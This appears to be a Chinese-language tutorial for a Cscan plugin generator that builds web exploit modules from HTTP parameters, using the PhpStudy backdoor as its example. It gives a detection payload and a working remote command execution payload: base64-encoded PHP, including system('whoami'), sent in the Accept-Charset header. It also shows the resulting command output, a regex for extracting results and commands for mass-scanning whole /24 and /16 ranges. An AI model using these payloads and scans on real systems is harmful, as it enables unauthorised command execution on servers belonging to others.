# Web漏洞插件生成器使用教程<br>
### 简介
Cscan Web Exp生成器包含4种提交方法Get/Post/Put/Delete,支持15个Http协议参数。<br>
用户无需编程能力，填写HTTP参数即可生成Web漏洞POC，快速扩展Cscan扫描能力。

### 运行环境<br>
运行环境：.net 3.5(Win7自带)<br>
将生成器和Cscan.exe放在同一目录<br>

### PhpStudy后门为例<br>
https://github.com/k8gege/PhpStudyDoor
### 0x001 测试POC<br>

打印字符串<br>
echo "ISDoorOK";<br>
K8飞刀Base64编码得到 ZWNobyAiSVNEb29yT0siOw==<br>
如包含 ISDoorOK ,返回PhpStudyDoor<br>

配置<br>
Accept-Encoding: gzip,deflate<br>
Accept-Charset: ZWNobyAiSVNEb29yT0siOw==<br>

PocTag: ISDoorOK<br>
PocName: PhpStudyDoor<br>

编译测试<br>
Cscan 5.2<br>
By K8gege<br>
load netscan.dll<br>
http://192.168.1.26     PhpStudyDoor<br>
Finished!<br>
![](https://github.com/k8gege/K8CScan/blob/master/ExpGenerator/Demo/PhpStudyPoc.PNG)

### 0x002 利用EXP
执行whoami命令<br>
echo 'start';system('whoami');echo 'end';<br>

配置<br>
Accept-Encoding: gzip,deflate<br>
Accept-Charset: ZWNobyAnc3RhcnQnO3N5c3RlbSgnd2hvYW1pJyk7ZWNobyAnZW5kJzs=<br>

编译测试<br>
Cscan 5.2<br>
By K8gege<br>
load netscan.dll<br>
startwin-4udh62v7dmn\null<br>
endHello World<br>
Finished!<br>
![](https://github.com/k8gege/K8CScan/blob/master/ExpGenerator/Demo/PhpStudyTest.PNG)
### 0x003 结果提取
Result勾选替换换行为空格<br>
正则: (?<=start).*?(?=end)<br>
![](https://github.com/k8gege/K8CScan/blob/master/ExpGenerator/Demo/PhpStudyExp.PNG)
### 0x004 批量调用
为了不被后续Exp覆盖,可将netscan.dll改名为PhpStudyExp.dll<br>
单个IP检测 Cscan 192.168.1.8 PhpStudyExp.dll<br>
单个URL检测Cscan http://192.168.1.8 PhpStudyExp.dll<br>
批量C段检测 Cscan 192.168.1.8/24 PhpStudyExp.dll<br>
批量B段检测 Cscan 192.168.1.8/16 PhpStudyExp.dll<br>
批量url.txt检测 Cscan PhpStudyExp.dll<br>
![](https://github.com/k8gege/K8CScan/blob/master/ExpGenerator/Demo/PhpStudyCscan.png)
### 0x005 下载
https://github.com/k8gege/K8CScan/tree/master/ExpGenerator
